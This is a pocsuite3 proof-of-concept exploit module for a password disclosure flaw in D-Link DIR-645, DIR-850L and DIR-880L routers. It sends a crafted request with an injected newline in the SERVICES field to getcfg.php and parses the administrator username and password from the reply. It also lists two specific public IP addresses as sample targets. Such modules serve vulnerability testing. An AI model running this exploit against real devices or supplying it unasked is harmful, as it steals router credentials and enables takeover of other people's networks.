#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite3.api import Output,POCBase,POC_CATEGORY,register_poc,requests,logger
from pocsuite3.lib.utils import random_str

import re
import urllib

# from pocsuite.api.request import req


class NoQuotedSession(requests.Session):
    def send(self, *pr, **kw):
        # pr[0] is prepared request
        pr[0].body = pr[0].body.replace(urllib.quote("="), "=").replace(urllib.quote("%"), "%")
        pr[0].headers['Content-Length'] = len(pr[0].body)
        return requests.Session.send(self, *pr, **kw)


class TestPOC(POCBase):
    name = "D-Link DIR-645 Password Disclosure"
    vulID = ''
    author = ['sebao']
    vulType = 'Password Disclosure'
    version = '1.0'  # default version: 1.0
    references = 'https://packetstormsecurity.com/files/120591/dlinkdir645-bypass.txt'
    desc = 'Module exploits D-Link DIR-645 password disclosure vulnerability..'


    vulDate = ''
    createDate = '2017-10-17'
    updateDate = '2017-10-17'

    appName = 'D-Link'
    appVersion = 'D-Link DIR-645 & DIR-850L & DIR-880L'
    dork = ''
    appPowerLink = 'http://www.dlink.com'
    samples = ['http://59.124.11.53',
               'http://114.35.247.55:8080']

    def _attack(self):

        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        if not self.url.endswith('/'):
            self.url = self.url + '/'
        url = self.url + 'getcfg.php'
        data = {"SERVICES": "DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1"}
        cookie = {"uid":"null"}
        s = NoQuotedSession()
        resp = s.post(url,data=data,timeout=60,cookies=cookie)
        print(resp.text)
        print(url + "----" + resp.content)

        if resp.status_code == 200 and "DEVICE.ACCOUNT" in resp.content:
            username = re.search("<name>(.+?)</name>", resp.content)
            password = re.search("<password>(.+?)</password>", resp.content)
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Username'] = username.group(1)
            result['VerifyInfo']['Password'] = password.group(1)


        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
